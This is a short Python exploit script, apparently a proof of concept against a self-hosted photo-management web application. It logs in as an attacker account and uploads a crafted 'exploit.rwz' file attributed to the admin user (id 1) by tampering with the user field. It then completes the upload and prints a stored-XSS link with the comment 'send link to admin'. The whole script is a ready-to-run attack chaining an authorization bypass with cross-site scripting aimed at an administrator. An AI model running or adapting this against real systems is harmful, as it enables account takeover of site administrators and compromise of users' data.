import requests
import json
import hashlib

url="https://localhost:3000"   # Replace with target URL
username="attacker"            # Replace with your username
password="attacker123"         # Replace with your password
file_to_upload_path="exploit.rwz"

login=requests.post(url+"/api/auth/token/obtain/",json={"username":username,"password":password})

jwt=login.cookies["jwt"]

refresh=json.loads(login.content)["refresh"]
access=json.loads(login.content)["access"]

cookies={"jwt":jwt,"refresh":refresh,"access":access}


def calculate_hash(path):
        hash_md5 = hashlib.md5()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""):
                hash_md5.update(chunk)
        return hash_md5.hexdigest()



with open(file_to_upload_path,"rb") as file:
    upload=requests.post(url+"/api/upload/",cookies=cookies,files={"file":file},data={"user":"1"})  #upload photo as admin (id=1)
    upload_id=json.loads(upload.content)["upload_id"]

md5h=calculate_hash(file_to_upload_path)

uploadComplete=requests.post(url+"/api/upload/complete/",cookies=cookies,data={"upload_id":upload_id,"user":"1","filename":"exploit.rwz","md5":md5h})

print("xss link: ",url+"/media/photos/"+md5h+"1")   # send link to admin
